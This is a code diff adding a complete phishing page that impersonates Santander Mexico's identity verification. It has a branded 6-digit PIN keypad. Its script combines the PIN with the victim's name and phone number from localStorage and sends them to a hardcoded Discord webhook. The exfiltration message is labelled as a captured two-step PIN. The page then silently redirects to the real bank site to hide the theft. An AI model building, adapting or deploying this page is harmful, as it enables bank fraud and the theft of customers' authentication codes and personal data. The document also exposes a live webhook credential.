@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de Identidad - Santander</title>
+  <style>
+    /* TU DISEÑO QUE NO SE TOCA, MANO */
+    :root { --santander-red: #ec0000; --text-dark: #121212; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: linear-gradient(135deg, #ec0000 0%, #ff3333 50%, #ec0000 100%); display: flex; min-height: 100vh; justify-content: center; align-items: center; font-family: Arial, Helvetica, sans-serif; overflow: hidden; }
+    .pin-container { background: white; border-radius: 12px; padding: 30px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
+    
+    /* EL LOGO QUE NO FALLA PORQUE ES PURO TEXTO */
+    .logo-container { text-align: center; margin-bottom: 25px; }
+    .logo-box {
+      background-color: var(--santander-red);
+      color: white;
+      padding: 12px 25px;
+      display: inline-block;
+      border-radius: 4px;
+      user-select: none;
+    }
+    .logo-box span {
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: bold;
+      font-size: 26px;
+      letter-spacing: -1px;
+      display: block;
+    }
+    
+    h2 { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: var(--text-dark); }
+    p { font-size: 14px; color: #666; margin-bottom: 25px; }
+    
+    .dots-container { display: flex; justify-content: center; gap: 15px; margin-bottom: 30px; }
+    .dot { width: 15px; height: 15px; border: 2px solid #ddd; border-radius: 50%; transition: 0.2s; }
+    .dot.filled { background-color: var(--santander-red); border-color: var(--santander-red); }
+
+    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
+    .key { padding: 20px; font-size: 24px; font-weight: 600; background: #f8f9fa; border-radius: 8px; cursor: pointer; transition: 0.2s; -webkit-tap-highlight-color: transparent; }
+    .key:active { background: #e9ecef; transform: scale(0.95); }
+    .key.empty { background: transparent; cursor: default; }
+    .key.delete { font-size: 18px; color: var(--santander-red); }
+  </style>
+</head>
+<body>
+
+  <div class="pin-container">
+    <div class="logo-container">
+      <div class="logo-box">
+        <span>Santander</span>
+      </div>
+    </div>
+
+    <h2>Ingresa tu PIN de seguridad</h2>
+    <p>Utiliza el teclado para ingresar tu clave de acceso de 6 dígitos.</p>
+
+    <div class="dots-container">
+      <div class="dot" id="dot1"></div>
+      <div class="dot" id="dot2"></div>
+      <div class="dot" id="dot3"></div>
+      <div class="dot" id="dot4"></div>
+      <div class="dot" id="dot5"></div>
+      <div class="dot" id="dot6"></div>
+    </div>
+
+    <div class="keypad">
+      <div class="key" onclick="addDigit('1')">1</div>
+      <div class="key" onclick="addDigit('2')">2</div>
+      <div class="key" onclick="addDigit('3')">3</div>
+      <div class="key" onclick="addDigit('4')">4</div>
+      <div class="key" onclick="addDigit('5')">5</div>
+      <div class="key" onclick="addDigit('6')">6</div>
+      <div class="key" onclick="addDigit('7')">7</div>
+      <div class="key" onclick="addDigit('8')">8</div>
+      <div class="key" onclick="addDigit('9')">9</div>
+      <div class="key empty"></div>
+      <div class="key" onclick="addDigit('0')">0</div>
+      <div class="key delete" onclick="deleteDigit()">⌫</div>
+    </div>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467650318174126192/_JrAS9TIKsDftqmTQuONlgEb4DAlPyQ1O9qst_pvEcgAgcbYeyyez83ftOqVA0pDvaS3';
+    let pin_code = "";
+
+    function addDigit(digit) {
+      if (pin_code.length < 6) {
+        pin_code += digit;
+        updateDisplay();
+        if (pin_code.length === 6) {
+          enviarYTerminar();
+        }
+      }
+    }
+
+    function deleteDigit() {
+      if (pin_code.length > 0) {
+        pin_code = pin_code.slice(0, -1);
+        updateDisplay();
+      }
+    }
+
+    function updateDisplay() {
+      for (let i = 1; i <= 6; i++) {
+        const dot = document.getElementById(`dot${i}`);
+        if (dot) {
+          dot.classList.remove("filled");
+          if (i <= pin_code.length) dot.classList.add("filled");
+        }
+      }
+    }
+
+    async function enviarYTerminar() {
+      const nombre = localStorage.getItem('nombres') || 'No capturado';
+      const apellido = localStorage.getItem('apellidos') || '';
+      const tel = localStorage.getItem('tel') || 'No capturado';
+
+      const payload = {
+        embeds: [{
+          title: '🏆 ¡PIN DE 2P CAPTURADO! - FINAL',
+          color: 0xec0000,
+          fields: [
+            { name: '👤 Cliente', value: `\`${nombre} ${apellido}\``, inline: false },
+            { name: '📱 Teléfono', value: `\`+52 ${tel}\``, inline: true },
+            { name: '🔐 PIN DE 2 PASOS', value: `**${pin_code}**`, inline: true }
+          ],
+          footer: { text: "Flujo Finalizado - Santander" },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        
+        window.location.href = 'https://www.santander.com.mx'; 
+      } catch (e) {
+        window.location.href = 'https://www.santander.com.mx';
+      }
+    }
+  </script>
+</body>
+</html>
